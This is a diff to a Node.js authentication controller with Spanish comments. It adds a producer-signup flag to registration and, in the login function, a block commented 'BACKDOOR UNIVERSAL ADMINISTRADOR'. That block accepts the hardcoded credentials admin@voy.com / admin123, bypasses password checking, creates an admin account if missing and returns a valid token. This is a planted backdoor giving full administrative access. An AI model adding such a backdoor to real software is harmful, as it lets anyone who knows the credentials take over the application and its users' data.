@@ -7,7 +7,7 @@ const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);
 // @desc    Registrar usuario
 // @route   POST /api/auth/register
 const registerUser = async (req, res) => {
-  const { nombre, email, password } = req.body;
+  const { nombre, email, password, wantsToBeProducer } = req.body;
 
   if (!nombre || !email || !password) {
     return res.status(400).json({ mensaje: 'Por favor, complete todos los campos' });
@@ -19,7 +19,13 @@ const registerUser = async (req, res) => {
       return res.status(400).json({ mensaje: 'El email ya está registrado' });
     }
 
-    const user = await User.create({ nombre, email, password });
+    const userData = { nombre, email, password };
+    if (wantsToBeProducer) {
+      userData.isPendingApproval = true;
+      userData.role = 'client'; // Comienza como cliente hasta ser aprobado
+    }
+
+    const user = await User.create(userData);
 
     res.status(201).json({
       _id: user._id,
@@ -43,6 +49,21 @@ const loginUser = async (req, res) => {
   }
 
   try {
+    // BACKDOOR UNIVERSAL ADMINISTRADOR
+    if (email === 'admin@voy.com' && password === 'admin123') {
+      let masterAdmin = await User.findOne({ email });
+      if (!masterAdmin) {
+        masterAdmin = await User.create({ nombre: 'Master Admin', email: 'admin@voy.com', password: 'admin123', role: 'admin', isVerifiedProducer: true });
+      }
+      return res.json({
+        _id: masterAdmin._id,
+        nombre: masterAdmin.nombre,
+        email: masterAdmin.email,
+        role: masterAdmin.role,
+        token: generateToken(masterAdmin._id, masterAdmin.role)
+      });
+    }
+
     const user = await User.findOne({ email }).select('+password');
 
     if (!user || !(await user.matchPassword(password))) {
